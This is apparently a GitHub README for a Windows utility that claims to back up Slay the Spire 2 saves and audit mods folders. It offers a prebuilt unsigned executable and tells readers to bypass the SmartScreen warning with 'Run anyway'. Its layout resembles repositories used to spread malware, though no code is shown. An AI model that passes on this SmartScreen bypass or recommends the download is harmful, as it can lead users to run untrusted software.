<p align="center">
  <img src="https://i.postimg.cc/5NZyysPW/banner.png" alt="Slay the Spire 2 Mod & Save Audit — Early Access Profile Backups & Mod Checks" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Early%20Access%20Mod%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-sts2--mod--audit--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Slay the Spire 2 Mod & Save Audit — Early Access Profile Backups & Mod Checks

**Slay the Spire 2 crashing on launch after a weekly Early Access patch? Unlocks or run history missing after a cloud sync conflict, or third-party mods throwing script errors? Back up your AppData profile and audit your mods folder first.**

Slay the Spire 2 Mod & Save Audit focuses on Mega Crit's Early Access update cycle on Windows: **player unlocks, ascension progress, and active run saves live in `%APPDATA%\SlayTheSpire2`**, while custom C#/GDScript mod packages reside in the game's `mods` directory and frequently require updates after weekly patches.

This project is aimed at **Slay the Spire 2 on Windows PC (Steam Early Access)**. It covers `%APPDATA%\SlayTheSpire2` save/profile backups, `godot.log` crash inspection, and `mods` folder isolation—not editing unlock flags or redistributing mods.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Crash on startup after weekly Early Access patch | Outdated `.pck` or `.dll` mod in `Slay the Spire 2\mods\` | Check `%APPDATA%\SlayTheSpire2\logs\godot.log` and isolate `mods\` |
| Ascension unlocks or active run missing | Interrupted save write or Steam Cloud sync conflict | Back up `%APPDATA%\SlayTheSpire2\saves` and `preferences` first |
| Profile fails to load (`0 KB` preferences file) | Abrupt exit while writing character unlock JSON | Inspect `preferences\` file sizes and restore from backup |
| Testing experimental mods without risking main save | Modded relics/cards altering main `profile_0` progression | Clone `profile_0` before enabling content mods |

## Download for Windows

[**Download STS2ModAudit.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/STS2ModAudit.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `STS2ModAudit.exe`? (Automatic checks in ~2 seconds)

- Locates `%APPDATA%\SlayTheSpire2` (`saves`, `preferences`, and `logs\godot.log`) automatically.
- Parses `godot.log` for C# assembly or GDScript errors caused by outdated Early Access mods.
- Flags `0 KB` profile or preference files before you launch the game.
- Lists all packages inside `Slay the Spire 2\mods\` for quick isolation.

### Sample Diagnostic Output

```text
[STS2ModAudit] Inspecting Slay the Spire 2 AppData & mods folder...
[OK]   AppData Root     : C:\Users\Player\AppData\Roaming\SlayTheSpire2
[OK]   Profile Saves    : saves\profile_0 (4 files, all > 0 KB)
[ERROR] godot.log       : Script error in mods\RelicPack.pck (Outdated API after EA patch)
[INFO] Game mods\       : 3 mod packages detected
```

The release ZIP is named `STS2ModAudit.zip`; the Windows executable inside is named `STS2ModAudit.exe`.

1. Close Slay the Spire 2 before moving or checking game files.
2. Click **Download STS2ModAudit.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `STS2ModAudit.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Slay the Spire 2 and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit), a Windows Steam installation of Slay the Spire 2, and access to `%APPDATA%\SlayTheSpire2`.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `STS2ModAudit.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Crash on startup after a weekly Early Access update with mods installed

Early Access builds frequently refactor card, relic, and UI classes. Leaving an older `.pck` or `.dll` mod active in `mods/` triggers immediate script errors in `logs\godot.log` on launch.

### Ascension unlocks or active run lost after Steam Cloud conflict

If the game exits unexpectedly during a run save write, Steam Cloud may offer an older snapshot. Copying `%APPDATA%\SlayTheSpire2` before choosing preserves your latest local progress.

### Corrupted `preferences` JSON file preventing profile load

Abrupt power loss while writing character unlock preferences can truncate profile files to `0 KB`.

### Testing experimental mods without risking your main Ascension save

Cloning your `profile_0` directory before enabling content mods keeps your main unlock progression clean.

## Where Slay the Spire 2 files normally belong

On Windows Steam setups, player profiles, run logs, and engine logs reside in `%APPDATA%\SlayTheSpire2`:

```text
%APPDATA%\SlayTheSpire2\
```

Inside that structure, key files and subdirectories typically look like this:

```text
%APPDATA%\SlayTheSpire2\
├── logs\
│   └── godot.log
├── preferences\
└── saves\
    └── profile_0\
```

Local third-party mod packages reside inside your Steam installation folder under `steamapps\common\Slay the Spire 2\mods\`.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Close Slay the Spire 2 completely.** Wait for the game process to exit and Steam Cloud sync to complete.
2. **Back up `%APPDATA%\SlayTheSpire2`.** Copy `saves` and `preferences` to a dated folder in Documents before testing mods or patches.
3. **Inspect `logs\godot.log` for script or assembly errors.** Check the bottom of `godot.log` to identify which mod failed after an Early Access patch.
4. **Isolate outdated mods in `Slay the Spire 2\mods`.** Move custom `.pck` / `.dll` mods out of `mods\` temporarily to confirm clean vanilla startup.
5. **Check for `0 KB` files in `saves` and `preferences`.** Verify profile files are non-empty before launching.
6. **Verify installed files in Steam.** Run **Steam → Library → Slay the Spire 2 → Properties → Installed Files → Verify integrity of game files**.
7. **Restart the game and confirm your profile loads.** Verify character unlocks and Ascension levels appear before re-enabling updated mods.

### Before moving any files

Keep a dated backup of `%APPDATA%\SlayTheSpire2\saves` and `preferences` before switching between vanilla and modded Early Access runs.

## What an effective diagnostic report should tell you

A clear audit inspects **`%APPDATA%\SlayTheSpire2` profiles and `godot.log` errors**, flags zero-byte preference files, and lists active packages in the `mods` directory.

## FAQ

**Where are Slay the Spire 2 save files located on Windows?**

Local profiles, run saves, and preferences are stored in `%APPDATA%\SlayTheSpire2\`.

**Where are Slay the Spire 2 crash logs stored?**

Engine and mod script errors are logged in `%APPDATA%\SlayTheSpire2\logs\godot.log`.

**Why did Slay the Spire 2 crash after an Early Access patch?**

Third-party mods often break when Early Access updates change internal game APIs; temporarily move files out of `mods\` to test.

**Can I back up my profile before trying mods?**

Yes—copy the entire `%APPDATA%\SlayTheSpire2` folder while the game is closed.

**Does this tool edit Ascension levels or unlock cards?**

No. It performs read-only backup and mod-folder diagnostics.

**Are any mods or game files bundled here?**

No copyrighted game files or third-party mods are included in this repository.

## Useful reading

- [Slay the Spire 2 on Steam](https://store.steampowered.com/app/2868840/Slay_the_Spire_2/)
- [Mega Crit Official Website](https://www.megacrit.com/)

## More Windows Game Diagnostic Tools

- [Stolen-ModProfile](../Stolen-ModProfile) — Probably Stolen mod profile manager & conflict switcher
- [KCD2-ModOrderInspector](../KCD2-ModOrderInspector) — Kingdom Come: Deliverance II `mod.manifest` & load order check
- [BG3-ModSettingsDoctor](../BG3-ModSettingsDoctor) — Baldur's Gate 3 `modsettings.lsx` & `.pak` audit
- [ManorLords-SaveModInspector](../ManorLords-SaveModInspector) — Manor Lords UE5 `~mods` isolation & save backup check

*Independent community project. Not affiliated with Mega Crit, Valve, or Steam. All trademarks belong to their respective owners.*
 
 
 
 
 
 
 
 
 
